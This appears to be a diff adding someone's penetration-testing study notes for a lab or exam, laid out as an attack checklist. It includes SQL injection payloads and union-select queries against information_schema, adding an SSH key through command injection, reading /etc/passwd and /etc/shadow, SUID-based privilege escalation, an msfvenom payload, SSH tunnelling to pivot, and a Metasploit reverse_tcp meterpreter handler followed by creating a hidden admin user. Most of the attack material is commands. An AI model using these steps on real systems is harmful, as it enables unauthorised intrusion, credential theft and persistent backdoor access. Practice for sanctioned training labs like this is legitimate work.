@@ -1,0 +1,98 @@
+MAKE OPNOTES THROUGH THE WHOLE THING
+
+first step scan the given ip
+do a banner grab on the open ports
+   nc <ip> <port>
+run http-enum.nse script against the http port
+   make note of the command and the results
+run a nikto scan against the same thing
+   nikto -host <ip> if going through tunnel nikto -host 0.0.0.0 -port <built tunnel port>
+
+SQL Injection WEB EXPLOITATION PORT 80 SHIT
+      connect to website on firefox <ip>:<port>
+      if you find an input field make note of the address
+         in opnotes make note of anything that works or doesnt work(command injection,directory traversal)
+         grab anything you can and move on
+         if a question asks what a users shell is look at /etc/passwd
+         CHECK /etc/hosts !!!!!!!!!!!!!!!
+      make note of findings in those files
+      if you find a command injection field or a webshell you can add your ssh key
+      if you find a username and password field it will be SQL injection
+         ' or 1='1 / ' or '1'='1 / try different variations
+         if it works:
+            reload the page with the dev console in the network tab click on the post and go to the cookies/header
+            click the raw button on the get copy the line and then click in the search bar and enter something like:
+            http://0.0.0.0:20001/login.php?username=%27+or+1%3D%271&passwd=%27+or+1%3D%271
+      SQL injection review with Sgt Wilson :)
+         if selection is a number try without quotes if not number it probably needs quotes
+         SQL Steps to success
+             1. selection=1 or 1=1#; iterate through all options using this to find the vulnerable one
+             1.1. document what you found (the web address of the vulnerable one)
+             2. identify which columns are which and identify how many (selection=7 union select 1,2,3)
+                if it doesn't work right off the bat with the inital number of columns keep adding numbers until it works
+             2.1. document the order of the columns and the amount
+             3. TEST THE GOLDEN STATEMENT(selection=7 union select table_schema(1),table_name(2),column_name(3) from information_schema.columns)
+             3.1. Document
+             4. Look at the question and figure out what it wants you to find
+                selection=7 union select username,user_id,name from siteusers.users
+             5. If creds are farmed attempt to login
+                If you come across passwords and they don't work try decoding with base64 or rot13
+             5.1. If none of them work make note and move on          
+            
+DOCUMENT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+If you come across passwords and they don't work try decoding with base64 or rot13
+
+INITIAL ACCESS
+    when getting onto the box
+       whoami
+       hostname
+       ip a
+       ifconfig -a
+       VERIFY YOU ARE IN A BASH SHELL
+    cat /etc/hosts (if not already done)
+    sudo -l
+ Priv Esc
+    look for way to escalate
+       find / -type f -perm /4000 -ls 2>/dev/null
+          send results through gtfobins!!!!!!!!!!!!!!!!!!!!!!!!!!
+             if you find something with gtfobins:
+                use the "exploit" to escalate to root
+                verify you are root with whoami
+       if you can't escalate make note of it
+ Checking for buffer overflow file
+    looking for nonstandard files IT WILL BE WEIRD
+    if gdb exists on the box you will be doing a buffer overflow
+       when you find a buffer overflow keep it simple stupid
+          msfvenom -p linux/x86/exec CMD="cat /etc/shadow" ... to cat the file you need
+    Check for more hops
+       conduct a ping sweep on the network(s) it's connected to
+          based on ttl you can make a guess on the kind of box it is
+       check ip neigh as a last resort
+       arp -an is very unreliable
+    if the ping sweep gives results create a dynamic tunnel to conduct nmap scans
+    ssh <name>@tgtip -D 9050
+    conduct nmap scans of the discovered ips
+       make note of the scan that was conducted
+    connect to the ips based on the available ports
+       if the open ports include 80 see above steps
+Windows Specific Notes (if 445/3389 is open)
+       IF ANY OF THE PORTS SAY WELCOME TO SECURE SERVER 
+         using msfconsole
+            use multi/handler
+            set payload windows/meterpreter/reverse_tcp
+            set lhost 0.0.0.0
+            set lport 1234
+            run
+            send payload
+            verify it works by looking for "Welcome to secure server"
+            create a user and add them to the admin group and the remote desktop groups
+            re-rdp to it as the new user
+      
+   once you gain access
+   look at the following:
+      services.msc
+         find the weird one and look at the properties
+         make note of the path
+         
+
+      
